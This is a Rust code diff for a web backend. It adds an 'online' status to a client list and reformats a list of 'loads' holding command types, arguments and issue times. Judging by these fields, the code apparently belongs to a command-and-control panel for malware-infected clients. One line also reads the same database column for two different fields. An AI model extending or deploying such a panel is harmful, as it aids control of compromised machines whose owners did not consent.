@@ -461,6 +461,7 @@ async fn api_clients_list(req_body: String) -> impl Responder {
 
         let mut connection: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
         let client_selection_sql = connection.query_iter(r"SELECT * FROM clients").await;
+        let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
     
         match client_selection_sql {
             Ok(_) => (),
@@ -472,8 +473,17 @@ async fn api_clients_list(req_body: String) -> impl Responder {
 
         let selected_clients = client_selection_sql.unwrap().collect::<Row<>>().await;
         let mut json_clients_list = json!({});
-
+      
         for row in selected_clients.unwrap() {
+
+            let is_online = {
+                if value_to_u64(&row, 13) + connection_interval > get_timestamp() {
+                    true
+                } else {
+                    false
+                }
+            };
+
             json_clients_list[value_to_str(&row, 0)] = json!(
                 {
                     "version": value_to_u64(&row, 1),
@@ -490,6 +500,7 @@ async fn api_clients_list(req_body: String) -> impl Responder {
                     "pid": value_to_u64(&row, 12),
                     "last_seen":value_to_u64(&row, 13),
                     "first_seen": value_to_u64(&row, 14),
+                    "online": is_online,
                 }
             );            
         }
@@ -583,12 +594,12 @@ async fn loads_list(req_body: String) -> impl Responder {
 
         for row in selected_loads.unwrap() {
             json_loads_list[value_to_str(&row, 0)] = json!({
-                    "required_amount": value_to_str(&row, 2),
-                    "recursive_load": value_to_bool(&row, 2),
-                    "cmd_args": value_to_str(&row, 3),
-                    "cmd_type": value_to_str(&row, 4),
-                    "time_issued": value_to_u64(&row, 5),
-                });            
+                "required_amount": value_to_str(&row, 2),
+                "recursive_load": value_to_bool(&row, 2),
+                "cmd_args": value_to_str(&row, 3),
+                "cmd_type": value_to_str(&row, 4),
+                "time_issued": value_to_u64(&row, 5),
+            });            
         }
         
         drop(connection); return resp_ok(json_loads_list.to_string());
